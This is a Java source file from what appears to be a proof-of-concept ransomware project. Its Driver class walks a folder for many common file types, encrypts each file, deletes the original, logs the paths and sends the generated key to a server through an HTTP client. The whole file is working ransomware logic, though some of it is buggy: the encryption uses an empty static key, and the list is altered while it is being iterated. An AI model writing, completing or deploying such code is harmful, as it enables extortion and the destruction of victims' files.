package ransomware;

import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.Collection;

import org.apache.commons.io.FileUtils;

import ransomware.exceptions.CryptoException;

public class Driver {
    private static String key = "";
    private static String[] extensions = { "png", "jpg", "jpeg", "gif", "pdf", "mp4", "mp3", "mid", "cda", "txt", "zip",
            "7z", "pkg", "tar", "tar.gz", "rar", "z", "json", "js", "html", "log", "sav", "xml", "docx", "bat", "py",
            "psd", "tif", "tiff" };
    private static String folderPath = "D:/Coding/POC-Ransomware/src/main/java/ransomware/testfiles/";
    private static File encryptedFileList = new File(
            "D:/Coding/POC-Ransomware/src/main/java/ransomware/encryptedFiles.list");

    public static void main(String[] args) throws Exception {
        HTTPClient Client = new HTTPClient();
        File folder = new File(folderPath);
        String key = generateKey();
        System.out.println(key);

        Collection<File> fileArray = FileUtils.listFiles(folder, extensions, true);
        fileArray.stream().forEach(t -> {
            try {
                encryptHelper(t);
            } catch (IOException e) {
                e.printStackTrace();
            }
        });

        for (File file : fileArray) {
            boolean hasExt = false;
            for (String ext : extensions) {
                if (hasExt) {
                    continue;
                }

                if (file.getName().endsWith(ext)) {
                    hasExt = true;
                }
            }

            if (!hasExt) {
                fileArray.remove(file);
            }
        }
        // File tempFile1 = new
        // File("D:/Coding/POC-Ransomware/src/main/java/ransomware/testfiles/AK.jpg.encrypted");
        // File tempDec1 = new
        // File("D:/Coding/POC-Ransomware/src/main/java/ransomware/testfiles/AKDECRYPTED.jpg");
        // decryptFile(key, tempFile1, tempDec1);

        try {
            Client.saveKey(key);
        } catch (Exception e) {
            e.printStackTrace();
        }

        key = ""; // Remove key from memory
    }

    public static void encryptHelper(File inputFile) throws IOException {
        File encryptedFile = new File(folderPath + inputFile.getName() + ".encrypted");
        encryptFile(key, inputFile, encryptedFile);
        inputFile.delete();
        FileUtils.writeStringToFile(encryptedFileList, inputFile.getAbsolutePath() + "\n",
                StandardCharsets.UTF_8.name(), true);
        System.out.println("Encrypted and deleted file: " + inputFile.getName());
    }

    public static void encryptFile(String key, File inputFile, File encryptedFile) {
        try {
            Utils.encrypt(key, inputFile, encryptedFile);
        } catch (CryptoException ex) {
            System.out.println(ex.getMessage());
            ex.printStackTrace();
        }
    }

    public static void decryptFile(String key, File inputFile, File decryptedFile) {
        try {
            Utils.decrypt(key, inputFile, decryptedFile);
        } catch (CryptoException ex) {
            System.out.println(ex.getMessage());
            ex.printStackTrace();
        }
    }

    public static String generateKey() {
        String alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890`~!@#$%^&*()_+-={}|[];'/.,:?><";
        String key = "";

        for (int i = 0; i < 32; i++) {
            key += Character.toString(alphabet.charAt((int) (Math.random() * alphabet.length())));
        }

        return key;
    }
}